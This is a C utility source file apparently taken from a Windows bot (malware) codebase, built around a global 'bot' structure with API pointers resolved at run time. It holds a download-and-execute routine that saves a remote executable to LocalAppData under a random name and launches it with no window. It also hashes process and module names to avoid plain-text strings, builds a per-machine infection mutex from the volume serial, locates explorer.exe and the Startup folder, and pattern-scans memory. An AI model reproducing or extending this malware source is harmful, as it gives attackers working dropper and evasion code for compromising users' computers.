#include "utils.h"
#include <TlHelp32.h>
#include <urlmon.h>

#include "string.h"
#include "api.h"
#include "mem.h"
#include "crypto.h"
#include "registry.h"

extern bot_t bot;

DWORD WINAPI FindProcessIDByHash(DWORD dwHash)
{
	HANDLE hSnapshot;
	PROCESSENTRY32W pe32;
	DWORD dwProcessID;

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
		return -1;

	dwProcessID = -1;

	memzero(&pe32, sizeof(PROCESSENTRY32W));
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (bot.api.pProcess32FirstW(hSnapshot, &pe32))
	{
		do 
		{
			DWORD dwCurrentHash = Crypto_crc32Hash(pe32.szExeFile, StrLengthW(pe32.szExeFile) * 2);

			if (dwCurrentHash == dwHash)
			{
				dwProcessID = pe32.th32ProcessID;
				break;
			}
		} 
		while (bot.api.pProcess32NextW(hSnapshot, &pe32));
	}

	bot.api.pCloseHandle(hSnapshot);

	return dwProcessID;
}
DWORD WINAPI FindProcessIDByHashEnd(void) { return 0; }

#define HASH_EXPLORER_EXE 0x095e2844

BOOL WINAPI IsOperatingSystem64Bit()
{
	LPWSTR pwzWinDir;
	wchar_t wzExplorerPath[MAX_PATH];
	BOOL bIs64 = FALSE;

	if ((pwzWinDir = GetWinDir()) == NULL)
		return FALSE;

	memzero(&wzExplorerPath, sizeof(wzExplorerPath));
	bot.api.pwsprintfW(wzExplorerPath, L"%s\\SysWOW64\\explorer.exe", pwzWinDir);

	bIs64 = FileExists(wzExplorerPath);

	memfree(pwzWinDir);

	return bIs64;
}
DWORD WINAPI IsOperatingSystem64BitEnd(void) { return 0; }

LPWSTR WINAPI GetWinDir()
{
	wchar_t wzWindowsDir[MAX_PATH];
	memzero(&wzWindowsDir, sizeof(wzWindowsDir));

	if (bot.api.pGetWindowsDirectoryW(wzWindowsDir, MAX_PATH) != 0)
	{
		return StrCopyW(wzWindowsDir, StrLengthW(wzWindowsDir));
	}

	return NULL;
}
DWORD WINAPI GetWinDirEnd(void) { return 0; }

LPWSTR WINAPI GetSystem32Dir()
{
	wchar_t wzSystemDir[MAX_PATH];
	memzero(&wzSystemDir, sizeof(wzSystemDir));

	if (bot.api.pGetSystemDirectoryW(wzSystemDir, MAX_PATH) != 0)
	{
		return StrCopyW(wzSystemDir, StrLengthW(wzSystemDir));
	}

	return NULL;
}

LPWSTR WINAPI GetFolderPath(DWORD dwCSIDL)
{
	LPWSTR pwzFolderPath;
	wchar_t wzBuffer[MAX_PATH];
	memzero(&wzBuffer, sizeof(wzBuffer));
	CWA(SHGetFolderPathW)(0, dwCSIDL, 0, 0, wzBuffer);

	if((pwzFolderPath = StrCopyW(wzBuffer, StrLengthW(wzBuffer))) == NULL)
		return NULL;

	if(!EndsWithSlashW(pwzFolderPath))
		StrConcatW(&pwzFolderPath, L"\\");
	
	return pwzFolderPath;
}

LPVOID WINAPI ReadFileFromDisk(const LPWSTR pwzPath, PDWORD pdwSize)
{
	HANDLE hFile;
	BOOL bSuccess;
	LPVOID lpFile;
	DWORD dwRead = 0;

	lpFile = NULL;
	bSuccess = FALSE;

	if ((hFile = bot.api.pCreateFileW(pwzPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) != INVALID_HANDLE_VALUE)
	{
		DWORD dwFileLength = bot.api.pGetFileSize(hFile, NULL);

		if ((lpFile = memalloc(dwFileLength)) != NULL)
		{
			bSuccess = bot.api.pReadFile(hFile, lpFile, dwFileLength, &dwRead, 0);

			*pdwSize = dwRead;
		}

		bot.api.pCloseHandle(hFile);
	}

	return lpFile;
}

BOOL WINAPI WriteFileToDisk(LPVOID lpFile, DWORD dwLength, const LPWSTR pwzPath)
{
	HANDLE hFile;
	DWORD dwWritten;
	BOOL bSuccess = FALSE;

	if ((hFile = bot.api.pCreateFileW(pwzPath, GENERIC_ALL, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0)) != INVALID_HANDLE_VALUE)
	{
		bSuccess = bot.api.pWriteFile(hFile, lpFile, dwLength, &dwWritten, NULL) && dwLength == dwWritten;

		bot.api.pCloseHandle(hFile);
	}

	return bSuccess;
}

DWORD WINAPI GetSerialNumber()
{
	wchar_t wzVolumeBuffer[MAX_PATH], wzFileSysName[MAX_PATH];
	DWORD dwSerialNumber, dwMaximumComponentLength, dwSysFlags;
	HANDLE hVolume;
	BOOL bResult = FALSE;

	memzero(&wzVolumeBuffer, sizeof(wzVolumeBuffer));
	memzero(&wzFileSysName, sizeof(wzFileSysName));

	if ((hVolume = CWA(FindFirstVolumeW)(wzVolumeBuffer, MAX_PATH)) == INVALID_HANDLE_VALUE)
		return 0;

	bResult = CWA(GetVolumeInformationW)(wzVolumeBuffer, NULL, MAX_PATH, &dwSerialNumber, &dwMaximumComponentLength, &dwSysFlags, wzFileSysName, MAX_PATH);

	CWA(FindVolumeClose)(hVolume);

	if (bResult)
		return dwSerialNumber;

	return 0;
}

DWORD WINAPI GetRandomNumber()
{
	return GetRandomNumberEx(0);
}

DWORD WINAPI GetRandomNumberEx(DWORD dwSeed)
{
	ULONG lRandomData;
	POINT mouse_point;
	memzero(&mouse_point, sizeof(POINT));

	if (!CWA(GetCursorPos)(&mouse_point))
		return 0;

	lRandomData = (mouse_point.x * mouse_point.y) * CWA(GetTickCount)();
	lRandomData += dwSeed;

	return Utils_RandomNumber(lRandomData);
}

DWORD Utils_RandomNumber(DWORD dwSeed)
{
	ULONG lRandomData;
	lRandomData = dwSeed;

	return CWA(RtlRandomEx)(&lRandomData);
}

BOOL WINAPI StartFileProcess(const LPWSTR pwzPath)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	memzero(&si, sizeof(STARTUPINFOW));
	memzero(&pi, sizeof(PROCESS_INFORMATION));

	if (bot.api.pCreateProcessW(pwzPath, pwzPath, 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi))
	{
		bot.api.pCloseHandle(pi.hProcess);
		bot.api.pCloseHandle(pi.hThread);

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI DownloadFile(const LPSTR pszURL, BOOL bExecute)
{
	LPWSTR pwzTempPath;
	BOOL bSuccess = FALSE;

	wchar_t wzDownloadPath[255], wzURL[255];
	if ((pwzTempPath = GetFolderPath(CSIDL_LOCAL_APPDATA)) == NULL)
		return FALSE;

	memzero(&wzDownloadPath, sizeof(wzDownloadPath));
	bot.api.pwsprintfW(wzDownloadPath, L"%s%d.exe", pwzTempPath, GetRandomNumber());

	memzero(&wzURL, sizeof(wzURL));
	bot.api.pMultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, pszURL, StrLengthA(pszURL), &wzURL, 255);

	if (bot.api.pURLDownloadToFileW(0, wzURL, wzDownloadPath, 0, 0) == S_OK)
	{
		if (bExecute)
		{
			bSuccess = StartFileProcess(wzDownloadPath);
		}
	}

	return bSuccess;
}

BOOL WINAPI FileExists(const LPWSTR pwzPath)
{
	HANDLE hFile;

	if ((hFile = bot.api.pCreateFileW(pwzPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE)
		return FALSE;
	
	bot.api.pCloseHandle(hFile);

	return TRUE;
}

HANDLE WINAPI CreateMutexOfProcess(DWORD dwProcessID)
{
	HANDLE hMutex;
	wchar_t wzMutex[255];

	memzero(&wzMutex, sizeof(wzMutex));
	bot.api.pwsprintfW(wzMutex, L"%x%x", GetSerialNumber(), dwProcessID);

	if ((hMutex = bot.api.pOpenMutexW(SYNCHRONIZE, FALSE, wzMutex)) == 0)
	{
		return bot.api.pCreateMutexW(0, FALSE, wzMutex);
	}

	bot.api.pCloseHandle(hMutex);

	return 0;
}

DWORD WINAPI GetCountOfThreadsByProcessId(DWORD dwProcessID)
{
	HANDLE hSnapshot;
	DWORD dwThreadCount;
	THREADENTRY32 te32;

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE)
		return -1;

	dwThreadCount = 0;

	memzero(&te32, sizeof(THREADENTRY32));
	te32.dwSize = sizeof(THREADENTRY32);

	if (bot.api.pThread32First(hSnapshot, &te32))
	{
		do
		{
			if (te32.th32OwnerProcessID == dwProcessID)
				dwThreadCount++;

		} while (bot.api.pThread32Next(hSnapshot, &te32));
	}

	bot.api.pCloseHandle(hSnapshot);

	return dwThreadCount;
}

DWORD WINAPI GetProcessIdByHandle(HANDLE hProcess)
{
	DWORD dwPbiSize = 0;
	PROCESS_BASIC_INFORMATION pbi;
	memzero(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

	if (bot.api.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &dwPbiSize) >= 0 && pbi.PebBaseAddress != 0)
	{
		return pbi.UniqueProcessId;
	}

	return -1;
}

DWORD WINAPI GetProcessIdByThreadHandle(HANDLE hThread)
{
	THREAD_BASIC_INFORMATION tbi;
	memzero(&tbi, sizeof(THREAD_BASIC_INFORMATION));

	if(bot.api.pNtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(THREAD_BASIC_INFORMATION), NULL) >= 0)
	{
		return tbi.ClientId.ClientID0;
	}

	return -1;
}

LPVOID Utils_GetModuleHandle(DWORD dwHash)
{
	DWORD i, dwCurrentHash, dwSize;
	LPWSTR pwzModuleName;
	PRTL_PROCESS_MODULES smi;
	LPVOID lpBase;

	dwSize = 0;
	
	CWA(LdrQueryProcessModuleInformation)(0, 0, &dwSize);

	if(dwSize == 0)
		return NULL;

	if((smi = (PRTL_PROCESS_MODULES)memalloc(dwSize)) == NULL)
		return NULL;

	lpBase = NULL;

	if(CWA(LdrQueryProcessModuleInformation)(smi, dwSize, 0) >= 0)
	{
		for(i = 0; i < smi->NumberOfModules; i++)
		{
			if((pwzModuleName = ansiToUnicodeEx(smi->Modules[i].FullPathName, smi->Modules[i].OffsetToFileName)) == NULL)
				continue;

			dwCurrentHash = Crypto_crc32Hash(pwzModuleName, StrLengthW(pwzModuleName) * 2);

			memfree(pwzModuleName);

			if(dwCurrentHash == dwHash)
			{
				lpBase = smi->Modules[i].ImageBase;
				break;
			}
		}
	}

	return lpBase;
}

utils_process_t* Utils_GetProcessList(DWORD* pdwProcessCount)
{
	DWORD dwSize;
	PSYSTEM_PROCESS_INFO spi;
	SYSTEM_PROCESS_INFO pi;
	utils_process_t* pProcessList = 0;
	dwSize = 0;

	if(pdwProcessCount == 0)
		return 0;

	*pdwProcessCount = 0;

	CWA(NtQuerySystemInformation)(SystemProcessInformation, 0, 0, &dwSize);

	if(dwSize == 0)
		return 0;

	if((spi = (PSYSTEM_PROCESS_INFO)memalloc(dwSize)) == 0)
		return 0;

	if(CWA(NtQuerySystemInformation)(SystemProcessInformation, spi, dwSize, 0) >= 0)
	{
		while(spi->NextEntryOffset)
		{
			if(spi->ProcessId != 0)
			{
				if(memreallocEx(&pProcessList, sizeof(utils_process_t) * (*pdwProcessCount + 1)))
				{
					memcopy(&pi, spi, sizeof(SYSTEM_PROCESS_INFO));

					pProcessList[*pdwProcessCount].dwProcessID = pi.ProcessId;
					pProcessList[*pdwProcessCount].pwzProcessName = StrCopyW(pi.ImageName.Buffer, StrLengthW(pi.ImageName.Buffer));
					pProcessList[*pdwProcessCount].dwProcessNameHash = Crypto_crc32Hash(pi.ImageName.Buffer, pi.ImageName.Length);

					*pdwProcessCount += 1;
				}
			}
			spi=(PSYSTEM_PROCESS_INFO)((LPBYTE)spi+spi->NextEntryOffset);
		}
	}

	return pProcessList;
}

LPSTR ParseModuleNameFromPath(LPSTR pszPath, DWORD dwNameIndex, DWORD dwPathLength)
{
	LPSTR pszName;
	DWORD dwNameLength;

	dwNameLength = dwPathLength - dwNameIndex;

	pszName = 0;

	if((pszName = (LPSTR)memalloc(dwNameLength + 1)) != 0)
	{
		memcopy(pszName, pszPath + dwNameIndex, dwNameLength);
	}

	return pszName;
}

LPWSTR ParseModuleNameFromPathToUnicode(LPSTR pszPath, DWORD dwNameIndex, DWORD dwPathLength)
{
	LPSTR pszName;

	if((pszName = ParseModuleNameFromPath(pszPath, dwNameIndex, dwPathLength)) != 0)
	{
		return ansiToUnicodeEx(pszName, StrLengthA(pszName));
	}

	return 0;
}

utils_module_t* Utils_GetModuleList(DWORD* pdwModuleCount)
{
	utils_module_t* pModuleList = 0;
	DWORD dwSize, i;
	PRTL_PROCESS_MODULES smi;
	RTL_PROCESS_MODULE_INFORMATION pmi;

	if(pdwModuleCount == 0)
		return 0;

	*pdwModuleCount = 0;
	
	dwSize = 0;
	
	CWA(LdrQueryProcessModuleInformation)(0, 0, &dwSize);

	if(dwSize == 0)
		return 0;
	
	if((smi = (PRTL_PROCESS_MODULES)memalloc(dwSize)) == 0)
		return 0;

	if(CWA(LdrQueryProcessModuleInformation)(smi, dwSize, 0) >= 0)
	{
		for(i = 0; i < smi->NumberOfModules; i++)
		{
			memcopy(&pmi, &smi->Modules[i], sizeof(RTL_PROCESS_MODULE_INFORMATION));

			if(memreallocEx(&pModuleList, sizeof(utils_module_t) * (*pdwModuleCount + 1)))
			{
				pModuleList[*pdwModuleCount].lpBase = pmi.ImageBase;
				pModuleList[*pdwModuleCount].pwzModuleName = ParseModuleNameFromPathToUnicode(pmi.FullPathName, pmi.OffsetToFileName, StrLengthA(pmi.FullPathName));
				pModuleList[*pdwModuleCount].dwHash = Crypto_crc32Hash(pModuleList[*pdwModuleCount].pwzModuleName, StrLengthW(pModuleList[*pdwModuleCount].pwzModuleName) * 2);
				*pdwModuleCount += 1;
			}
		}
	}

	memfree(smi);
	
	return pModuleList;
}

DWORD Utils_GetCurrentProcessId(void)
{
	PROCESS_BASIC_INFORMATION pbi;
	memzero(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

	if(CWA(NtQueryInformationProcess)(CURRENT_PROCESS, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0) >= 0)
	{
		return pbi.UniqueProcessId;
	}

	return -1;
}

LPSTR Utils_GetCurrentProcessName(void)
{
	utils_module_t* pModuleList;
	DWORD dwModuleCount, i;
	LPSTR pszProcessName;

	dwModuleCount = 0;
	pModuleList = 0;
	pszProcessName = 0;

	if((pModuleList = Utils_GetModuleList(&dwModuleCount)) != 0)
	{
		pszProcessName = unicodeToAnsiEx(pModuleList[0].pwzModuleName, StrLengthW(pModuleList[0].pwzModuleName));	

		for(i = 0; i < dwModuleCount; i++)
		{
			if(pModuleList[i].pwzModuleName != 0)
				memfree(pModuleList[i].pwzModuleName);
		}

		memfree(pModuleList);
	}

	return pszProcessName;
}

void Utils_Sleep(DWORD dwMiliseconds)
{
	LARGE_INTEGER li;
	li.QuadPart = -((LONGLONG)dwMiliseconds * 10000);
	CWA(NtDelayExecution)(FALSE, &li);
}

LPWSTR Utils_GetPath(int iPathIndex)
{
	LPWSTR pwzNames[] = { L"AppData", L"Desktop", L"Startup" };
	LPWSTR pwzPath = 0;

	if(Registry_ReadValue(HIVE_HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", pwzNames[iPathIndex], &pwzPath))
	{
		if(!EndsWithSlashW(pwzPath))
		{
			if(!StrConcatW(&pwzPath, L"\\"))
			{
				memfree(pwzPath);
				pwzPath = 0;
			}
		}

		return pwzPath;
	}

	return 0;
}

LPWSTR GetExplorerPath()
{
	BOOL bIs64Bit;
	LPWSTR pwzWinDir;
	wchar_t wzExplorerPath[MAX_PATH];

	if ((pwzWinDir = GetWinDir()) == NULL)
		return NULL;

	bIs64Bit = IsOperatingSystem64Bit();
	memzero(&wzExplorerPath, sizeof(wzExplorerPath));

	if (bIs64Bit)
	{
		bot.api.pwsprintfW(wzExplorerPath, L"%s\\SysWOW64\\explorer.exe", pwzWinDir);
	}
	else bot.api.pwsprintfW(wzExplorerPath, L"%s\\explorer.exe", pwzWinDir);

	memfree(pwzWinDir);

	return StrCopyW(wzExplorerPath, StrLengthW(wzExplorerPath) * 2);
}

DWORD GetModuleSize(HMODULE hModule)
{
	PIMAGE_DOS_HEADER pDOS;
	PIMAGE_NT_HEADERS pNT;

	if (hModule)
	{
		pDOS = (PIMAGE_DOS_HEADER)hModule;
		pNT = (PIMAGE_NT_HEADERS)(pDOS->e_lfanew + (DWORD)hModule);
		if (pNT->Signature == IMAGE_NT_SIGNATURE && pDOS->e_magic == IMAGE_DOS_SIGNATURE)
		{
			return pNT->OptionalHeader.SizeOfImage;
		}
	}
	return 0;
}


static BOOL bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
	for (; *szMask; ++szMask, ++pData, ++bMask)
	{
		if (*szMask == 'x' && *pData != *bMask)
		{
			return FALSE;
		}
	}
	return (*szMask) == 0;
}

DWORD FindPattern(DWORD dwAddress, DWORD dwSize, BYTE* pbMask, char* szMask)
{
	DWORD i;

	for (i = 0; i < dwSize; i++)
	{
		if (bDataCompare((BYTE*)(dwAddress + i), pbMask, szMask))
		{
			return (DWORD)(dwAddress + i);
		}
	}

	return 0;
}